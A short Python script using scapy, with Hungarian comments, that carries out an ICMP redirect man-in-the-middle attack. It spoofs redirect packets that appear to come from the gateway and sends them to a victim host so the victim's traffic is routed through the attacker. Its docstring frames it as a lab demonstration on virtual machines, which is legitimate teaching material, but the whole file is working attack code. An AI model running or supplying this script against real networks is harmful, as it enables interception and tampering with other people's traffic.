#!/usr/bin/env python3
"""Gateway MITM ICMP Redirect-del: az áldozatnak azt hazudjuk, hogy a gateway
a támadón át érhető el egy adott cél felé.

Futtatás: sudo python3 icmp_redirect.py eth0 <victim_ip> <gateway_ip> [prefix]
Megjegyzés: a demonstrációhoz az áldozat VM-en engedélyezni kell:
  sysctl -w net.ipv4.conf.eth0.accept_redirects=1
(a modern alapértelmezés tiltja — ez maga is tanulság!)
"""
import sys, time
from scapy.all import Ether, IP, ICMP, sendp, conf, arping, get_if_hwaddr

def resolve(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    prefix = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0/0"
    conf.iface = iface
    vmac = resolve(victim, iface)
    att_ip = getattr(conf.iface, "ip", None) or "10.10.10.66"
    target_ip = prefix.split("/")[0]
    pkt = (Ether(src=get_if_hwaddr(iface), dst=vmac) /
           IP(src=gateway, dst=victim) /              # "a gateway-től"
           ICMP(type=5, code=1, gw=att_ip) /          # redirect host, a támadón át
           IP(src=victim, dst=target_ip))
    print(f"[*] ICMP redirectek: {victim} felé, a gateway-nek kiadva magunkat ({gateway})...")
    try:
        for _ in range(20):
            sendp(pkt, verbose=0)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    print("[!] A PC-V-n az 'ip route' parancs mutatja a redirect-től telepített route-ot.")

if __name__ == "__main__":
    main()
